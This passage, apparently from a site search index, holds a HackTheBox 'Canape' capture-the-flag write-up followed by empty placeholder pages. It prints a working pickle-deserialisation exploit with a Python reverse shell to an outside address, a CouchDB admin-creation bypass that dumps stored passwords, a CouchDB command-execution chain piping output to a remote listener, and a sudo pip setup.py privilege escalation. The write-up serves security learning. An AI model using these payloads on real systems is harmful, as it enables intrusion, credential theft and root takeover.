+ quote)[:10]\n                p_id = md5(char + quote).hexdigest()\n                outfile = open( /tmp/  + p_id +  .p ,  wb )\n        outfile.write(char + quote)\n        outfile.close()\n            success = True\n        except Exception as ex:\n            error = True\n\n    if error:\n        return  html p1 error /p1 /html \n    else:\n        return  html p1 success /p1 /html \n    #return  render_template( submit.html , error=error, success=success)\n\n@app.route( /check , methods=[ POST ])\ndef check():\n    print request.form[ id ]\n    path =  /tmp/  + request.form[ id ] +  .p \n    data = open(path,  rb ).read()\n\n    if  p1  in data:\n        item = cPickle.loads(data)\n    else:\n        item = data\n    print item\n    return  Still reviewing:   + item\n\nif __name__ ==  __main__ :\n    app.run(host= 0.0.0.0 )  (it may be a little modified, but the core parts are there.)\nSo with this version running locally, I continued developing my exploit to get a reverse shell, and after a couple of minutes, I achieved this:   import requests\n#import base64\nfrom hashlib import md5\n\nPATH_REMOTE =  http://10.10.10.70/{} \nPATH_LOCAL =  http://192.168.0.15:5000/{} \nREMOTE = True\n\ndef submit_exploit(cmd):\n    action = 'submit'\n    char =  S'homer'\\np1\\ncos\\nsystem\\n(S'{cmd}'\\ntRS'marge'\\np1\\n .format(cmd=cmd)\n    quote = '.'\n    payload =  character={char} quote={quote} .format(char=char,quote=quote)\n    headers = {'Content-type': 'application/x-www-form-urlencoded'}\n    path = PATH_REMOTE.format(action) if REMOTE else PATH_LOCAL.format(action)\n    print payload\n    r = requests.post(path, data=payload, headers=headers)\n    if r.status_code == 200 and ( thank you for your suggestion  in r.text.lower() or 'success' in r.text.lower()): \n        print  [+] Payload successfully sent. Command: {cmd} .format(cmd=cmd)\n        #return base64.encodestring(char+quote)[:10]\n        return md5(char+quote).hexdigest()\n    else:\n        print  [-] Error sending payload \n        raise Exception( Error sending payload: \\n\\tHttp code returned: {http_code}. \\n\\t response body:\\n {body} .format(http_code= r.status_code, body=r.text))\n\ndef check_and_run_exploit(id_code):\n    action = 'check'\n    headers = {'Content-type': 'application/x-www-form-urlencoded'}\n    payload =  id={id_code} .format(id_code=id_code)\n    path = PATH_REMOTE.format(action) if REMOTE else PATH_LOCAL.format(action)\n    r = requests.post(path, data=payload, headers=headers)\n    if r.status_code == 200: \n        print  [+] Exploit successfully executed \n        return r.text\n    else:\n        print  [-] Error executing exploit \n        raise Exception( Error executing exploit: \\n\\tHttp code returned: {http_code}. \\n\\t response body:\\n {body} .format(http_code= r.status_code, body=r.text))\n\nif __name__ ==  __main__ :\n    cmd =  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\ 10.10.14.255\\ ,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\ /bin/sh\\ ,\\ -i\\ ]);' \n    id_code = submit_exploit(cmd)\n    check_and_run_exploit(id_code)  Two disclaimers:   The first and last part of the payload have two strings Homer and Marge. The first one is to bypass the whitelist filtering that app has regarding the name of the character. The last one is to avoid the application to trigger and error when concatenating the result of the Pickle.load() to a string (otherwise it will try to concatenate a number (the error code of the executed command) and a string, and it will fail).  The REMOTE variable is just something custom made to quickly switch between the Remote server and my local one.   After launching the exploit, we get a reverse shell in the port 4444. Once we got the reverse shell, we upgraded to tty (see ippsec video) in order to have more features (history, auto-completition, etc).   Although, we have a reverse shell, the user running the HTTP server is  www-data , so we need to escalate privileges and log in as other user. \nOnce inside the machine, my first move was to run  LinEnum.sh . Once of the outputs of it was the following:    I spent hours, trying to understand this file. Until I gave up (hopefully I did it) and continue looking in another place. I guess it was a  BIG  troll.  Analyzing the applications running on the system and its ports, I found the  couchdb  running in localhost. \nI started reading a little bit about this DB (never saw it before), and quickly figure it out how to connect to it:   $  curl -X GET http://localhost:5984\n{ couchdb : Welcome , version : 2.0.0 , vendor :{ name : The Apache Software Foundation }}  I started playing around a little more and figured it out how to list dbs and docs inside them:   $  curl -X GET http://localhost:5984/_all_dbs\n[ _global_changes , _metadata , _replicator , _users , passwords , simpsons ]\n$  curl -X GET http://localhost:5984/simpsons/_all_docs\n{ total_rows :7, offset :0, rows :[\n{ id : f0042ac3dc4951b51f056467a1000dd9 , key : f0042ac3dc4951b51f056467a1000dd9 , value :{ rev : 1-fbdd816a5b0db0f30cf1fc38e1a37329 }},\n{ id : f53679a526a868d44172c83a61000d86 , key : f53679a526a868d44172c83a61000d86 , value :{ rev : 1-7b8ec9e1c3e29b2a826e3d14ea122f6e }},\n{ id : f53679a526a868d44172c83a6100183d , key : f53679a526a868d44172c83a6100183d , value :{ rev : 1-e522ebc6aca87013a89dd4b37b762bd3 }},\n{ id : f53679a526a868d44172c83a61002980 , key : f53679a526a868d44172c83a61002980 , value :{ rev : 1-3bec18e3b8b2c41797ea9d61a01c7cdc }},\n{ id : f53679a526a868d44172c83a61003068 , key : f53679a526a868d44172c83a61003068 , value :{ rev : 1-3d2f7da6bd52442e4598f25cc2e84540 }},\n{ id : f53679a526a868d44172c83a61003a2a , key : f53679a526a868d44172c83a61003a2a , value :{ rev : 1-4446bfc0826ed3d81c9115e450844fb4 }},\n{ id : f53679a526a868d44172c83a6100451b , key : f53679a526a868d44172c83a6100451b , value :{ rev : 1-3f6141f3aba11da1d65ff0c13fe6fd39 }}\n$  curl -X GET http://localhost:5984/passwords/_all_docs\n{ error : unauthorized , reason : You are not a server admin. }  So the job now seems to be getting server admin. After a google search looking for vulnerabilties affecting this DB in this version, I found this  EXCELENT   blogpost . Basically the attack consist in creating a server admin without any credentials only by sending an HTTP request (for further details, read the blog).  I changed (just the names) a little bit the PoC of the blog and executed against the db:   $  curl -X PUT 'http://localhost:5984/_users/org.couchdb.user:oops' --data-binary '{\n   type :  user ,\n   name :  tsuller ,\n   roles : [ _admin ],\n   roles : [],\n   password :  tsuller \n}'\n{ ok :true, id : org.couchdb.user:tsuller , rev : 1-0b547bb36cb610ec21d9571312f6e20c }  Yes! Seems that it worked! Lets check:  $  curl -X GET http://tsuller:tsuller@localhost:5984/_passwords/_all_docs\n{ total_rows :4, offset :0, rows :[\n{ id : 739c5ebdf3f7a001bebb8fc4380019e4 , key : 739c5ebdf3f7a001bebb8fc4380019e4 , value :{ rev : 2-81cf17b971d9229c54be92eeee723296 }},\n{ id : 739c5ebdf3f7a001bebb8fc43800368d , key : 739c5ebdf3f7a001bebb8fc43800368d , value :{ rev : 2-43f8db6aa3b51643c9a0e21cacd92c6e }},\n{ id : 739c5ebdf3f7a001bebb8fc438003e5f , key : 739c5ebdf3f7a001bebb8fc438003e5f , value :{ rev : 1-77cd0af093b96943ecb42c2e5358fe61 }},\n{ id : 739c5ebdf3f7a001bebb8fc438004738 , key : 739c5ebdf3f7a001bebb8fc438004738 , value :{ rev : 1-49a20010e64044ee7571b8c1b902cf8c }}\n]}  YES! Worked. Lets dump the content of each doc:  $  curl http://tsuller:tsuller@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc4380019e4\n{ _id : 739c5ebdf3f7a001bebb8fc4380019e4 , _rev : 2-81cf17b971d9229c54be92eeee723296 , item : ssh , password : 0B4jyA0xtytZi7esBNGp , user : }\n$  curl http://tsuller:tsuller@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc43800368d\n{ _id : 739c5ebdf3f7a001bebb8fc43800368d , _rev : 2-43f8db6aa3b51643c9a0e21cacd92c6e , item : couchdb , password : r3lax0Nth3C0UCH , user : couchy }\n$  curl http://tsuller:tsuller@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc438003e5f\n{ _id : 739c5ebdf3f7a001bebb8fc438003e5f , _rev : 1-77cd0af093b96943ecb42c2e5358fe61 , item : simpsonsfanclub.com , password : h02ddjdj2k2k2 , user : homer }\n$  curl http://tsuller:tsuller@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc438004738\n{ _id : 739c5ebdf3f7a001bebb8fc438004738 , _rev : 1-49a20010e64044ee7571b8c1b902cf8c , user : homerj0121 , item : github , password : STOP STORING YOUR PASSWORDS HERE -Admin }  If we pay atenttion to the  home  directory, we'll just find  homer  user. So my next step was to try to login with this user using some of this credentials. Fortunately, the first one (the  ssh  one) worked, and seconds later I was able to get the user flag:", 
            "title": "User"
        }, 
        {
            "location": "/ctfs/hackthebox/canape/#root", 
            "text": "To start, I ran again the  LinEnum.sh  but this time tried to pay a little more of attention to the output, but... it was worthless. Nothing point me to the right direction.  In some moment, I thought that the couchdb was running as  root . I decided to look for some public exploit. Fortunately, I found one that allowed you to execute commands if you were a system admin. Not only we had the user created by us, but also  couchy  (look the docs of the  password  db) was admin. \nThanks to this  blogpost  first, and a little help from  this  also I was able to successfully execute commands:   curl -X PUT 'http://couchy:r3lax0Nth3C0UCH@localhost:5986/_config/query_servers/cmd' -d ' whoami | curl http://10.10.14.255:5555 -d @- '  --insecure\ncurl -X PUT 'http://couchy:r3lax0Nth3C0UCH@localhost:5986/testing' --insecure\ncurl -X PUT 'http://couchy:r3lax0Nth3C0UCH@localhost:5986/testing/blah' -d '{ _id : 770855a97726d5666d70a22173005c77 }' --insecure\ncurl -X POST 'http://couchy:r3lax0Nth3C0UCH@localhost:5986/testing/_temp_view?limit=11' -d '{ language : cmd , map : }' -H 'Content-Type: application/json' --insecure  Unfortunately, when I went to my shell where I was hosting the NC in port 5555, the news were bad. The answer of the  whoami  wasn't root but homer. I must have confused with some other running process.   I continued looking for some interesting thing, but nothing showed up.   During that search, I issued:   sudo -l   And this was the output:\n![sudoers][./images/canape/sudoers.png]  For those not very familiar, this means that the user  homer  can run as  root  the command  pip install  without providing a password (this comes from the configuration of the /etc/sudoers file). How can we abuse this?  PIP  is a python packet manager. It allows not only to write down the package you want (and if it's in the pipy repository download it) but also it allows you to install packages providing the source file directly. Usually, python packages have a very particular file called  setup.py  which is the one in charge of really installing the package in your enviroment (virtual env or general env).   So my idea was to, download a compressed version of package that already exists (I pick  request  because is my favourite lib), modify it's code, compress it again and try to install it using sudo:   Downloaded the source code from  here .  Decompressed it.  Added the following line to the setup.py:   os.system('cat /root/root.txt   /tmp/4877df3bb9dfe713a404dd8d6e4e94cc.p')  (I used that name just to try not to spoil to anybody the flag due to in /tmp there are all the submitted quotes)  Compressed it again.  Served it in a python serve so you can copy it to the machine .\n* Executed:  sudo /usr/bin/pip install blablabla.tar.gz   Read the flag from  /tmp/4877df3bb9dfe713a404dd8d6e4e94cc.p  Modify again the previous setup.py again, this time to delete the flag file and don't spoil to anyone =D.", 
            "title": "Root"
        }, 
        {
            "location": "/ctfs/own/eko2017/kidnapped/", 
            "text": "PlaceHolder", 
            "title": "Kidnapped"
        }, 
        {
            "location": "/ctfs/own/eko2017/kidnapped/#placeholder", 
            "text": "", 
            "title": "PlaceHolder"
        }, 
        {
            "location": "/ctfs/own/eko2018/kidnapped_revenge/", 
            "text": "PlaceHolder", 
            "title": "Kidnapped the Revenge"
        }, 
        {
            "location": "/ctfs/own/eko2018/kidnapped_revenge/#placeholder", 
            "text": "", 
            "title": "PlaceHolder"
        }, 
        {
            "location": "/ctfs/own/eko2019/secret_spy_message/", 
            "text": "PlaceHolder", 
            "title": "Secret Spy Message"
        }, 
        {
            "location": "/ctfs/own/eko2019/secret_spy_message/#placeholder", 
            "text": "", 
            "title": "PlaceHolder"
        }, 
        {
            "location": "/ctfs/own/eko2019/rich_text/", 
            "text": "PlaceHolder", 
            "title": "The Rich Text"
        }, 
        {
            "location": "/ctfs/own/eko2019/rich_text/#placeholder", 
            "text": "", 
            "title": "PlaceHolder"
        }, 
        {
            "location": "/ctfs/own/eko2019/defuse_bomb/", 
            "text": "PlaceHolder", 
            "title": "Defuse the bomb"
        }, 
        {
            "location": "/ctfs/own/eko2019/defuse_bomb/#placeholder", 
            "text": "", 
            "title": "PlaceHolder"
        }, 
        {
            "location": "/ctfs/own/eko2019/guess_my_number/", 
            "text": "PlaceHolder", 
            "title": "Guess my number"
        }, 
        {
            "location": "/ctfs/own/eko2019/guess_my_number/#placeholder", 
            "text": "", 
            "title": "PlaceHolder"
        }, 
        {
            "location": "/tiny_tools/almost_sudo/", 
            "text": "PlaceHolder", 
            "title": "Almost sudo"
        }, 
        {
            "location": "/tiny_tools/almost_sudo/#placeholder", 
            "text": "", 
            "title": "PlaceHolder"
        }, 
        {
            "location": "/tiny_tools/pastemon/", 
            "text": "PlaceHolder", 
            "title": "Pastemon"
        }, 
        {
            "location": "/tiny_tools/pastemon/#placeholder", 
            "text": "", 
            "title": "PlaceHolder"
        }, 
        {
            "location": "/arduino/robot/", 
            "text": "PlaceHolder", 
            "title": "Robot"
        }, 
        {
            "location": "/arduino/robot/#placeholder", 
            "text": "", 
            "title": "PlaceHolder"
        }, 
        {
            "location": "/etw/introduction/", 
            "text": "PlaceHolder", 
            "title": "Introduction"
        }, 
        {
            "location": "/etw/introduction/#placeholder", 
            "text": "", 
            "title": "PlaceHolder"
        }
    ]
}